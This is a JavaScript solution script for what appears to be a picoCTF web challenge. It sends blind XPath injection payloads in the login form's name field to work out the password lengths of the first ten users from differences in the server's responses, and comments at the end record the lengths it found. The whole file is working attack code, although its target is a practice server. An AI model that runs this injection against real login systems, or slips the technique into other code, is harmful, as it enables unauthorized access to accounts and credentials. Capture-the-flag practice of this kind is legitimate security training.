
import fs   from 'fs';
import http from 'http';



const COUNT = {};
const USERS = {};

const writeUsers = () => {
	fs.writeFileSync('password-lengths.json', JSON.stringify(USERS, null, '\t'));
};

const attack_length = (user_id) => {

	for (let length = 0; length <= 64; length++) {

		let payload = "";

		payload += "name=" + encodeURIComponent("' or string-length(//user[position()=" + user_id + "]/pass)>" + length + " or 'a'='");
		payload += "&pass=whatever"; // TODO: Bruteforce this!?

		let request = http.request('http://mercury.picoctf.net:28065/', {
			headers: {
				'Content-Length': payload.length,
				'Content-Type': 'application/x-www-form-urlencoded'
			},
			method: 'POST'
		}, (response) => {

			const chunks = [];

			response.on('data', (data) => chunks.push(data));
			response.on('end', () => {

				let html = Buffer.concat(chunks).toString('utf8');
				if (html.includes('You&#39;re on the right path.') === true) {

					if (COUNT[user_id] === undefined) {
						COUNT[user_id] = length;
					} else if (length > COUNT[user_id]) {
						COUNT[user_id] = length;
					}

					console.log('user #' + user_id + ' password is longer than ' + length + ' characters.');

				} else if (html.includes('Login failure.') === true) {

					if (USERS[user_id] === undefined) {
						USERS[user_id] = length;
					} else {
						USERS[user_id] = Math.min(USERS[user_id], length);
					}

					fs.writeFileSync('users/' + user_id + '-' + length + '.html', html);
					writeUsers();

				}

			});

		});

		request.on('error', (err) => {
			console.error(user_id, length, err);
		});

		request.end(payload);

	}

};

for (let id = 1; id <= 10; id++) {
	attack_length(id);
}

// We found out:
// - user id=1 has password with length=16
// - user id=2 has password with length=22
// - user id=3 has password with length=50 (likely the flag?)

